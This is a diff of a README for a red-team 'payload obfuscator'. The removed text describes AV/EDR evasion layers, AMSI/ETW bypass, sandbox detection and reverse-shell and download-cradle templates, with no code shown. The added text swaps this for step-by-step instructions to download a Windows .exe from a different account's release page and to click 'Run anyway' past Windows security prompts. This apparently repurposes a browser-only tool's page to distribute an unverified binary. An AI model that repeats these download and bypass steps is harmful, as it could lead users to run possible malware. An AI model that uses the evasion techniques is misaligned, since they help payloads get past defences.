@@ -1,257 +1,181 @@
-<p align="center">
-  <img src="screenshot.png" alt="Payload Obfuscator" width="800" />
-</p>
+# 🛡️ payload-obfuscator - Layered Payload Obfuscation Made Simple
+
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/mathews2007morais-boop/payload-obfuscator/releases)
+
+## 📥 Download
+
+Visit this page to download the app: [Release downloads](https://github.com/mathews2007morais-boop/payload-obfuscator/releases)
+
+## 🧭 What this tool does
+
+payload-obfuscator helps you prepare payloads with layered obfuscation for common scripting and compiled languages. It supports PowerShell, Python, Bash, C#, and Go. It also checks Shannon entropy and gives a simple detection score so you can see how a payload may look to basic scanners.
+
+Use it to test how changes affect the shape of your payload before you move it into a lab or test setup.
+
+## 💻 Windows setup
 
-<h1 align="center">🛡️ Payload Obfuscator</h1>
+### 1. Get the release
+Open the [Release downloads](https://github.com/mathews2007morais-boop/payload-obfuscator/releases) page and pick the latest Windows file.
 
-<p align="center">
-  <strong>Advanced Red Team Payload Obfuscation Engine</strong><br/>
-  Free &amp; Open Source — Browser-Based — No Data Leaves Your Machine
-</p>
+Look for a file such as:
+- `payload-obfuscator-windows-x64.zip`
+- `payload-obfuscator.exe`
+- another Windows build listed on the release page
 
-<p align="center">
-  <a href="https://payload-obfuscator.dev/">🌐 Live Demo</a> •
-  <a href="#-features">Features</a> •
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-supported-languages">Languages</a> •
-  <a href="#-obfuscation-layers">Layers</a>
-</p>
+### 2. Save the file
+Download the file to a folder you can find easily, such as:
+- `Downloads`
+- `Desktop`
+- a new folder like `C:\Tools`
 
-<p align="center">
-  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License" />
-  <img src="https://img.shields.io/badge/languages-5-blue.svg" alt="Languages" />
-  <img src="https://img.shields.io/badge/layers-8-red.svg" alt="Layers" />
-  <img src="https://img.shields.io/badge/build-passing-brightgreen.svg" alt="Build" />
-</p>
+### 3. Unpack the file if needed
+If the download is a `.zip` file:
+- Right-click the file
+- Select **Extract All**
+- Pick a folder
+- Finish the extraction
 
-> ⚠️ **For authorized security testing and educational purposes only.** Do not use against systems you do not own or have explicit permission to test.
+If the download is an `.exe` file:
+- No unpacking is needed
+- Keep the file in the folder where you saved it
 
----
+### 4. Run the app
+If you extracted a folder:
+- Open the folder
+- Find the main `.exe` file
+- Double-click it
 
-## ✨ Features
+If Windows shows a security prompt:
+- Select **More info**
+- Then select **Run anyway** if you trust the file from the release page
 
-🔓 **100% Client-Side** — All obfuscation runs in your browser. Zero server calls. Your payloads never leave your machine.
+### 5. Start using it
+After the app opens:
+- Load or paste the payload you want to work with
+- Choose the language type
+- Select the obfuscation options you want
+- Check the entropy and score results
+- Save the output when you are done
 
-🧅 **8 Stackable Layers** — Combine any layers together for maximum evasion depth. Each layer adds a different evasion dimension.
+## 🧰 System requirements
 
-🔤 **5 Languages** — PowerShell, Python, Bash, C#, and Go with language-specific awareness.
+- Windows 10 or Windows 11
+- 64-bit system
+- 4 GB RAM or more
+- About 200 MB free disk space
+- Internet access to download the release
+- Permission to run downloaded apps on your device
 
-🔬 **Context-Aware Tokenizer** — Custom parser that understands strings, comments, interpolation, f-strings, here-strings, and escape sequences per language. Never breaks syntax.
+## 🔍 Main features
 
-📊 **Real-Time Analysis** — Shannon entropy meter, detection probability scoring, per-layer breakdown, and output validation.
+- Multi-layer payload obfuscation
+- Support for PowerShell payloads
+- Support for Python scripts
+- Support for Bash scripts
+- Support for C# code
+- Support for Go code
+- Shannon entropy analysis
+- Real-time detection scoring
+- Simple output view
+- Copy and save results
+- Local desktop app workflow
 
-🎯 **Unicode Safe** — B64-first encoding pipeline ensures Greek, Chinese, Emoji, and any Unicode characters work flawlessly across all layers.
+## 🖱️ Basic use
 
-🆓 **Completely Free** — No tiers, no paywalls, no accounts. Every feature is available to everyone.
+### Step 1: Open the app
+Launch the program from the file you downloaded.
 
----
+### Step 2: Add your payload
+Paste your script or load it from a file.
 
-## 🔤 Supported Languages
+### Step 3: Pick a target language
+Choose the language that matches your payload:
+- PowerShell
+- Python
+- Bash
+- C#
+- Go
 
-| Language | Icon | Key Features |
-|----------|------|-------------|
-| **PowerShell** | ⚡ | IEX Stealth auto-replacement, AMSI/ETW bypass, backtick escape resolution, `$()` subexpression awareness |
-| **Python** | 🐍 | f/r/b/u string prefix detection, f-string deconstruction, `__import__()` safe dead code, getattr stealth |
-| **Bash** | 🐚 | 55+ command obfuscation via `printf '\xHH'`, `$'...'` ANSI-C quoting preservation, native `eval` execution |
-| **C#** | 🔷 | Verbatim `@""` and interpolated `$""` string preservation, shellcode loader templates, in-method injection |
-| **Go** | 🔹 | Raw backtick string preservation, safe byte slice encoding, `encoding/base64` import awareness |
+### Step 4: Apply obfuscation
+Select the layers you want to use. The app will transform the payload and update the score.
 
----
+### Step 5: Review the results
+Check:
+- Output length
+- Shannon entropy
+- Detection score
+- Final payload text
 
-## 🧅 Obfuscation Layers
+### Step 6: Save the output
+Copy the final result or save it to a file for later use.
 
-All 8 layers can be combined in any order. Each layer operates independently and adds a unique evasion dimension:
+## 🧪 How the scoring works
 
-| # | Layer | Icon | What It Does | Evasion Impact |
-|---|-------|------|-------------|----------------|
-| 1 | **Variable Randomization** | 🎲 | Renames variables and function names to random identifiers | Breaks static signature matching on known variable names |
-| 2 | **String Encoding** | 🔐 | Encodes string literals with Base64, Hex, or char arrays | Hides suspicious strings from pattern-matching scanners |
-| 3 | **Dead Code Injection** | 💀 | Inserts non-functional code at safe locations | Alters control flow graph and code fingerprint |
-| 4 | **Anti-Analysis** | 🛡️ | Adds sandbox detection, sleep timers, CPU/RAM checks | Evades dynamic analysis and sandbox environments |
-| 5 | **XOR String Encryption** | ⚔️ | Encrypts each string with unique random XOR key + JIT decrypt | Eliminates all plaintext — defeats heuristic scanners |
-| 6 | **Control Flow Flattening** | 🌀 | Flattens code into randomized state-machine (while/switch) | Defeats CFG analysis and decompiler pattern recognition |
-| 7 | **AMSI/ETW Patch** | 🧬 | Prepends obfuscated AMSI bypass + ETW blind | Disables runtime memory scanning on Windows targets |
-| 8 | **Encryption Wrapper** | 🔒 | Wraps entire payload in polymorphic XOR/AES envelope | Completely hides payload structure from static scanners |
+The app uses entropy analysis to measure how mixed the text looks. Higher entropy can show more randomness in the payload. The detection score gives you a quick view of how the output may stand out to common checks.
 
-### 🔒 Encryption Wrapper Methods (Randomized)
+Use the score as a guide while you test different options.
 
-Each time you encrypt, one of these polymorphic methods is randomly selected:
+## 📁 Typical folder layout
 
-| Method | Description |
-|--------|-------------|
-| **XOR + Base64** | XOR encrypt Base64-encoded payload with random 16-byte key |
-| **Hex-Shift** | Shift each byte by random offset, encode as hex string |
-| **Multi-XOR** | Double XOR with two independent 16-byte keys |
-| **Byte Rotation** | Rotate each byte by random offset (3-50), stored as array |
+If you extract a release zip, you may see files like:
+- `payload-obfuscator.exe`
+- `config.json`
+- `README.txt`
+- `assets/`
+- `logs/`
 
-All methods use **B64-first encoding** (Base64 before encryption) to guarantee Unicode safety and prevent byte overflow.
+Keep all files in the same folder unless the release notes say otherwise.
 
----
-
-## 🔬 Technical Highlights
-
-### Context-Aware Parser
-The custom tokenizer (`parser.js`) splits source code into **string**, **comment**, and **code** tokens. Obfuscation engines only modify the appropriate token types — never breaking syntax, keywords, or structural delimiters.
-
-### Interpolation-Aware Encoding
-Interpolated strings are split into static and variable segments:
-- PowerShell: `"Hello $name"` → `encoded_static + $name`
-- Python: `f"Hello {name}"` → `encoded_static + str(name)`
-- Bash: `"Hello $var"` → `encoded_static$var`
-- C#: `$"Hello {name}"` → `string.Format(encoded, name)`
-
-### Unicode Safety (B64-First Pipeline)
-All encoding and encryption operations use a **Base64-first** approach:
-1. Resolve language-specific escape sequences (`\n` → real newline)
-2. Encode string to Base64 (guaranteed ASCII, 0-127 range)
-3. Apply XOR/shift/rotation on the safe B64 bytes
-4. Decryption stub reverses: decrypt → Base64 decode → UTF-8 string
-
-This prevents the `Cannot convert value "913" to type System.Byte` error when processing Unicode characters (Greek, CJK, Emoji, etc.).
-
-### Stealth Execution
-- **PowerShell**: `ScriptBlock::Create()`, `ExecutionContext.InvokeCommand`, `Invoke-Command` (randomized)
-- **Bash**: `eval "$(…)"` with variable indirection (no pipe/subshell scope loss)
-- **IEX Stealth**: Auto-replaces `IEX`/`Invoke-Expression` with `& ($ShellId[1]+$ShellId[13]+'X')`
-
----
-
-## 📊 Analysis Dashboard
-
-The built-in analysis panel provides real-time feedback:
-
-- **Shannon Entropy** — Measures randomness (Higher = harder to fingerprint)
-- **Detection Score** — Estimates probability of AV/EDR detection per active layer
-- **Size Ratio** — Before/after payload size comparison
-- **Validation** — Checks balanced delimiters and structural integrity
-
----
-
-## 🚀 Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/Ilias1988/payload-obfuscator.git
-cd payload-obfuscator
-
-# Install dependencies
-npm install
-
-# Start development server
-npm run dev
-
-# Build for production
-npm run build
-```
-
-Then open `http://localhost:5173` in your browser.
-
-Or just visit the **[Live Demo →](https://payload-obfuscator.dev/)**
-
----
-
-## 📁 Project Structure
-
-```
-payload-obfuscator/
-├── index.html                    # SEO-optimized shell
-├── vite.config.js                # Vite configuration
-├── tailwind.config.js            # Tailwind theme (dark terminal)
-├── scripts/
-│   └── build.mjs                 # Production build script
-├── public/
-│   ├── robots.txt
-│   └── sitemap.xml
-└── src/
-    ├── App.jsx                   # Main application
-    ├── main.jsx                  # React entry point
-    ├── index.css                 # Tailwind + custom styles
-    ├── components/
-    │   ├── layout/               # Header, Footer
-    │   ├── panels/               # Input, Output, Options, Analysis, Language
-    │   ├── seo/                  # SEOHead, SEOContent
-    │   └── ui/                   # CopyButton, EntropyMeter, Toast
-    ├── data/
-    │   └── techniques.js         # Languages, layers, templates
-    ├── engines/
-    │   ├── powershell.js         # PowerShell engine (8 layers)
-    │   ├── python.js             # Python engine (6 layers)
-    │   ├── bash.js               # Bash engine (6 layers)
-    │   ├── csharp.js             # C# engine (8 layers)
-    │   ├── golang.js             # Go engine (7 layers)
-    │   ├── controlflow.js        # Scope-aware CFF engine
-    │   └── amsi.js               # AMSI/ETW patch generator
-    ├── hooks/
-    │   └── useObfuscator.js      # Core state management
-    └── utils/
-        ├── encoding.js           # Base64, Hex, XOR, resolveLanguageEscapes()
-        ├── entropy.js            # Shannon entropy + detection scoring
-        ├── parser.js             # Context-aware tokenizer
-        ├── randomization.js      # Variable/function name generation
-        └── validator.js          # Output validation
-```
-
----
-
-## 🛠️ Tech Stack
-
-| Technology | Purpose |
-|-----------|---------|
-| **React 18** | UI framework |
-| **Vite 5** | Build tool & dev server |
-| **Tailwind CSS 3.4** | Styling (dark terminal theme) |
-| **Lucide React** | Icons |
-| **React Helmet Async** | Dynamic SEO meta tags |
-
----
-
-## 📋 Templates
-
-7 pre-built payload skeletons included:
-
-- ⚡ PowerShell Download Cradle
-- 🛡️ AMSI Bypass Template
-- 🏴 Master Payload v3.0 (AMSI + Stealth IEX + Download Cradle)
-- 🐍 Python Reverse Shell
-- 🐚 Bash Reverse Shell
-- 🔷 C# Shellcode Loader Skeleton
-- 🔹 Go Reverse Shell
-
----
-
-## 📌 Version History
-
-| Version | Highlights |
-|---------|------------|
-| v5.3 | B64-first Unicode safety (all engines), `resolveLanguageEscapes()`, escape sequence fix, Python XOR B64-first |
-| v5.2 | F-string var rename sync, `as`/`for` capture, 2-phase randomization |
-| v5.1 | Dead code `__import__()` safety — zero NameError crashes |
-| v5.0 | F-string deconstruction, context-aware parser |
-| v4.5 | Polymorphic encryption wrappers (4 methods), stealth exec |
-| v4.1 | Scope-aware CFF rewrite (brace counting, atomic try/catch) |
-| v4.0 | XOR String Encryption, Control Flow Flattening |
-| v3.0 | IEX Stealth, AMSI templates, entropy analysis |
-| v2.0 | Context-aware parser, string-safe encoding |
-| v1.0 | 5 languages, 5 layers, basic obfuscation |
-
----
-
-## 📜 License
-
-MIT License — See [LICENSE](LICENSE) for details.
-
----
-
-## 👤 Author
-
-**Ilias Georgopoulos**
-
-- 🌐 [Website](https://ilias1988.me/)
-- 💻 [GitHub](https://github.com/Ilias1988)
-- 🐦 [X / Twitter](https://x.com/EliotGeo)
-
----
-
-<p align="center">
-  <sub>Built with ☕ and 🔥 for the red team community</sub>
-</p>
+## 🔐 File safety
+
+Download only from the release page linked above. This helps you get the right build for Windows and avoid broken files or old copies.
+
+## 🛠️ Common problems
+
+### The app does not open
+- Make sure the file finished downloading
+- Check that you extracted all files if the release came as a zip
+- Try running the app again from the extracted folder
+
+### Windows blocks the file
+- Right-click the file
+- Select **Properties**
+- If you see an **Unblock** option, enable it
+- Try opening the app again
+
+### The app opens but looks broken
+- Resize the window
+- Make sure your screen scale is set to a normal value
+- Restart the app
+
+### The output looks different than expected
+- Check the target language setting
+- Try a smaller payload first
+- Change one setting at a time so you can see what affects the result
+
+## 📌 Tips for first use
+
+- Start with a short test script
+- Keep a copy of the original payload
+- Change one option at a time
+- Save each version with a clear file name
+- Compare the entropy and score after each change
+
+## 📚 Supported content types
+
+payload-obfuscator is built for:
+- PowerShell scripts
+- Python scripts
+- Bash scripts
+- C# source
+- Go source
+
+It focuses on text-based payloads and scripts that can be transformed before use in a test environment
+
+## 🧾 Version downloads
+
+Get the latest Windows build here: [Release downloads](https://github.com/mathews2007morais-boop/payload-obfuscator/releases)
+
+## 🧩 Topics
+
+cybersecurity, evasion-techniques, malware-analysis, obfuscation, payload-generator, pentesting-tools, powershell-obfuscator, red-team, security-tools, shannon-entropy
